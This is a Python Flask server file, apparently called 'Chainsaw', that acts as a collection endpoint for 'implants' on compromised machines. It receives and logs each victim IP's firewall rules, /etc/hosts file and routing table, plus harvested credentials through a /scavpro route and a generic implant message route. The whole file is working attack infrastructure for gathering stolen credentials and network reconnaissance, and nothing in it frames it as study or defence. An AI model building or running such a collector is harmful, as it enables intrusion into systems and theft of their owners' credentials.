import datetime
from flask import Flask, request
from . import app
from .log import log, log_creds, log_fw, log_generic, log_hosts, log_routes

@app.route('/')
@app.route('/status')
def index():
    return "Chainsaw is running"

@app.route('/campfire', methods=['POST'])
def process_campfire():
    content = request.json
    ip = content['ip']
    fwall = content['rules']
    hosts = content['etchosts']
    routes = content['routes']

    log_fw(ip, fwall)
    log_hosts(ip, hosts)
    log_routes(ip, routes)

    return "Success"


@app.route('/generic', methods=['POST'])
def generic_log():
    """Forward a generic log message from the implants. This is used as a catch-all
    """
    content = request.json
    ip = content['IP']
    creds = content['message']
    log_generic(ip, creds)
    return "Success"


@app.route('/scavpro', methods=['POST'])
def process_scavpro():
    content = request.json
    ip = content['IP']
    creds = content['credentials']
    log_creds(ip, creds)
    return "Success"
